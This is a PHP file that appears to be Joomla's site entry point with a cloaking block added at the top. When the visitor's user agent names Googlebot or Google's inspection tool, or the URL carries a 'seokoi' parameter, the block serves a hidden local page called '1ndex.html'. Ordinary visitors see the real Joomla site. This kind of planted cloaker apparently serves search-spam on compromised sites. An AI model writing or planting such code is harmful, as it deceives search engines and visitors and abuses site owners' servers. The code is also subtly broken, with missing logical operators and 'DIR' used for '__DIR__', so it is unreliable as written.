<?php
// ============================================================
// JOOMLA CLOAKER — Local index.html Render
// Googlebot → index.html göster
// Kullanıcılar → Joomla
// ============================================================

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$q = isset($_GET['seokoi']);
$isBot = (strpos($ua, 'googlebot') !== false  strpos($ua, 'inspectiontool') !== false  $q);

if ($isBot) {
    // Botlara gösterilecek local dosya
    $localFile = DIR . '/1ndex.html';

    if (file_exists($localFile)) {
        while (ob_get_level()) ob_end_clean();
        header('Content-Type: text/html; charset=utf-8');
        header('Vary: User-Agent');
        header('X-Robots-Tag: index, follow, archive');
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        readfile($localFile);
        exit;
    } else {
        // index.html yoksa fallback
        echo '<h1>Bot İçin İçerik</h1>';
        exit;
    }
}

// --- JOOMLA NORMAL ÇALIŞMA ---
define('JOOMLA_MINIMUM_PHP', '5.3.10');

if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<')) {
    die('Your host needs to use PHP ' . JOOMLA_MINIMUM_PHP . ' or higher to run this version of Joomla!');
}

$startTime = microtime(1);
$startMem  = memory_get_usage();

define('_JEXEC', 1);

if (file_exists(__DIR__ . '/defines.php')) {
    include_once DIR . '/defines.php';
}

if (!defined('_JDEFINES')) {
    define('JPATH_BASE', __DIR__);
    require_once JPATH_BASE . '/includes/defines.php';
}

require_once JPATH_BASE . '/includes/framework.php';

JDEBUG ? JProfiler::getInstance('Application')->setStart($startTime, $startMem)->mark('afterLoad') : null;

$app = JFactory::getApplication('site');
$app->execute();
